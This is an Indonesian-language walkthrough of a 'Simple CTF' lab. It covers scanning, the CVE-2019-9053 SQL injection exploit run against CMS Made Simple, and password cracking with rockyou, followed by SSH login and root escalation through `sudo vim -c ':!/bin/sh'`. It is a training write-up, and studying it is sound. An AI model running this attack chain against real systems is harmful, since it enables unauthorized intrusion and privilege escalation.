@@ -1,0 +1,15 @@
+# langkah - langkah simple ctf
+- pertama scan network menggunakan `sudo nmap ip-target`, dan kita bisa melihat ada 3 port yang terbuka 21 ftp,80 http,dan 2222 ssh
+- lalu jalankan `dirsearch -u http://ip-target`, dan kita mendapat `http://ip-target/simple`, lalu coba kita akses url tersebut
+- langkah selanjutnya kita mencari versi cve dari aplikasi tersebut, caranya hanya mencari versi dari cms tersebut dan search di google untuk mendapatkan versi cvenya 
+- buat nyari cvenya, kita search aja di google `CMS Made Simple 2.2.8 exploit`
+- abis di search, google bakal direkomendasiin ke url `https://www.exploit-db.com/exploits/46635`
+- kita udah dapet cvenya `CVE-2019-9053`, untuk kerentanannya kita bisa liat dari judul script pyton di bawah `Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9` kalo script ini untuk kerentanan sql injeksi atau biasa di singkat `sqli`
+- script pytonnya bisa kita download, atau di copas dengan format namafile.py, setelah itu kita jalanin scriptnya `python2 -u url-target/cms -c -w wordlist-yang-ingin-digunakan`, contohnya kaya gini `python 46635.py -u "http://10.10.26.215/simple/" -c -w /usr/share/wordlists/rockyou.txt`, -u: url, -c: cookie, -w: wordlist
+- setelah menjalankan script python tadi, kita akan mendapatkan password `secret` dan username `mitch`
+- lalu kita login ke ssh nya `ssh user@ip -p portnya`
+- setelah berhasil login, jalankan `ls` dan kita menemukan `user.txt`, dan jika kita `cat user.txt` maka akan menampilkan `G00d j0b, keep up!`
+- lalu jalankan `ls /home` untuk mengetahui apa ada user lain di direktori home, dan kita mendapatkan user `sunbath` di direktori home.
+- lalu kita coba jalankan `sudo -l`, Kita dapat melihat pengguna "mitch" dapat menjalankan `/usr/bin/vim` tanpa password
+- lalu kita pergi ke `https://gtfobins.github.io/gtfobins/vim/#sudo`, dan sepertinya kita bisa menjalankan perintah `sudo vim -c ':!/bin/sh'` untuk meningkatkan hak istimewa kita
+- kita berhasil mendapatkan hak akses root, sekarang kita hanya perlu mencari flag root, kita hanya perlu menjalankan perintah `ls /root` dan mendapatkan `root.txt`, lalu tinggal jalankan perintah `cat /root/root.txt` dan kita berhasil mendapatkan flag root `W3ll d0n3. You made it!`
